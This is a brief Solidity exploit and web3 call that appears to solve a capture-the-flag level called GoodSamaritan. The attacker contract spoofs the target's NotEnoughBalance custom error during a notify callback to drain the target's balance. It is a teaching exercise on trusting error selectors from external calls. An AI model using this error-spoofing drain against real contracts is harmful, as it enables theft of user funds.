// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface GoodSamaritanInterface {
    function requestDonation() external returns(bool);
}

contract GoodSamaritan {
    error NotEnoughBalance();
    function notify(uint256 amount) pure  external{
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
    function getMoney(address addr) public {
        GoodSamaritanInterface(addr).requestDonation();
    }
}

//web3.eth.sendTransaction({from:player, to:"0x4461D4e29d3639b50147dac9Be0BcC7d673Ca46B", data:web3.utils.sha3("getMoney(address)").slice(0,10)+"000000000000000000000000" + "CC03F3D117113EF43151A8467334C519546f63d6"})
